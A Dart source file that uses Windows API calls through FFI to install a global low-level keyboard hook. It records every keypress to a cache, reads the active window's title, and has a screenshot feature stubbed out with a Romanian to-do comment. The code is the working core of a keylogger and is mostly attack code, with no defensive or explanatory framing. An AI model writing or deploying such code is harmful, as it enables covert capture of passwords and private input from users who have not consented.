import 'dart:ffi';

import 'package:ffi/ffi.dart';

import 'package:schema/imports.dart';
import 'package:schema/functions/addToCache.dart';
import 'package:schema/functions/screenshot.dart';

final hmod = GetModuleHandle(nullptr);

Pointer hhook;

int Callback(int nCode, int wParam, int lParam) {
  if (nCode == 0) {
    if (wParam == WM_KEYDOWN) {
      KBDLLHOOKSTRUCT kbdStruct =
          Pointer.fromAddress(lParam).cast<KBDLLHOOKSTRUCT>().ref;

      final key = toCorrectKey(wParam, kbdStruct.vKCode);

      addToCache(key);
    }
  }

  return CallNextHookEx(hhook, nCode, wParam, lParam);
}

void setHook() {
  final lpfn = Pointer.fromFunction<HookCallback>(Callback, 0);

  hhook = SetWindowsHookEx(WH_KEYBOARD_LL, lpfn, hmod, 0);
}

void main() {
  final int hWnd = GetForegroundWindow();

  final Pointer<Utf16> lpString = allocate();

  const int nMaxCount = 256;

  final windowTextSize = GetWindowText(hWnd, lpString, nMaxCount);

  final windowText = toUtf16(lpString, windowTextSize);

  free(lpString);

  print(windowText);

  // mai trb sa lucrez la asta
  // screenshot();

  setHook();

  final msg = MSG.allocate();

  while (GetMessage(msg.addressOf, 0, 0, 0) != 0) {
    TranslateMessage(msg.addressOf);
    DispatchMessage(msg.addressOf);
  }

  print('sal');
}
